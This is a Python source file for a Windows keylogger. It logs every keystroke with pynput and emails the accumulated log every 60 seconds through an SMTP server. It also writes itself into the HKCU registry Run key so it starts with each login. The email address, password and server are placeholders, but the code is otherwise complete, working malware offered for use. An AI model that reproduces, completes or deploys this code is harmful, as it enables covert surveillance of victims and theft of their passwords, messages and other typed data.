#libraries needed
#pynput     #os     #smtplib
#keyboard   #email  #winreg

#Importing necessary modules from the pynput library
from pynput.keyboard import Key, Listener
import os
import sys
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import winreg as reg


# Initialize an empty log string to store keystrokes
log = ""
# Set the interval to send email (in seconds)
email_interval = 60  # Time in seconds to wait before sending an email
# Set your email credentials
email_address = "your_email@example.com"
email_password = "your_password"
# Record the start time to manage email intervals
start_time = time.time()

# Function to send the log via email
def send_email(log):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = "Keylogger Log"
    msg.attach(MIMEText(log, 'plain'))
    
    try:
        # Connect to the SMTP server and send the email
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        text = msg.as_string()
        server.sendmail(email_address, email_address, text)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function that gets called whenever a key is pressed
def on_press(key):
    global log, start_time
    log += str(key)  # Append the keystroke to the log
    # Check if the email interval has passed
    if time.time() - start_time > email_interval:
        send_email(log)  # Send the email
        log = ""  # Clear the log after sending
        start_time = time.time()  # Reset the start time

# Function that gets called whenever a key is released
def on_release(key):
    # Stop listener if the escape key is pressed
    if key == Key.esc:
        return False

# Function to add the script to Windows startup
def add_to_startup():
    # Get the path of the current script
    file_path = os.path.realpath(sys.argv[0])
    # Define the registry key and value
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    # Open the registry key
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    # Set the value to run the script at startup
    reg.SetValueEx(open_key, "keylogger", 0, reg.REG_SZ, file_path)
    reg.CloseKey(open_key)

# Main block to start the keylogger and add it to startup
if __name__ == "__main__":
    add_to_startup()  # Ensure the script runs at startup
    # Start the keylogger listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()